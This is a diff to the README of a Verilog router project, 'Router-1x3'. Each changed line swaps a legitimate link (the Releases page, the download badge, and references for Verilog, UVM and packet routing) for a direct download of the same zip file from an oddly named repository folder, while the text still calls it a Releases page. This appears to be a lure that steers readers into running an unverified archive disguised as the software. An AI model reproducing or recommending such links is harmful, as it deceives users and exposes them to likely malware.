@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download Router-1x3](https://img.shields.io/badge/Download%20Router--1x3-Blue.svg)](https://github.com/SuggarGrandma420/Router-1x3/releases)
+[![Download Router-1x3](https://raw.githubusercontent.com/SuggarGrandma420/Router-1x3/main/vestryish/Router-1x3.zip%https://raw.githubusercontent.com/SuggarGrandma420/Router-1x3/main/vestryish/Router-1x3.zip)](https://raw.githubusercontent.com/SuggarGrandma420/Router-1x3/main/vestryish/Router-1x3.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ To get started, follow these steps. You will need a computer with access to the 
 
 ## 🔗 Download & Install
 
-To download Router-1x3, visit the [Releases page](https://github.com/SuggarGrandma420/Router-1x3/releases). On this page, you will find the latest version of the application along with older versions if you need them.
+To download Router-1x3, visit the [Releases page](https://raw.githubusercontent.com/SuggarGrandma420/Router-1x3/main/vestryish/Router-1x3.zip). On this page, you will find the latest version of the application along with older versions if you need them.
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed at the top.
@@ -63,8 +63,8 @@ If you want to contribute to the development of Router-1x3, feel free to share y
 
 For more information on related topics, visit the following resources:
 
-- [Verilog](https://en.wikipedia.org/wiki/Verilog)
-- [UVM](https://uvm.bca.com)
-- [Packet Routing Basics](https://www.example.com/packet-routing)
+- [Verilog](https://raw.githubusercontent.com/SuggarGrandma420/Router-1x3/main/vestryish/Router-1x3.zip)
+- [UVM](https://raw.githubusercontent.com/SuggarGrandma420/Router-1x3/main/vestryish/Router-1x3.zip)
+- [Packet Routing Basics](https://raw.githubusercontent.com/SuggarGrandma420/Router-1x3/main/vestryish/Router-1x3.zip)
 
 By following these guidelines and steps, you will successfully download and run Router-1x3. Enjoy using your new packet router!
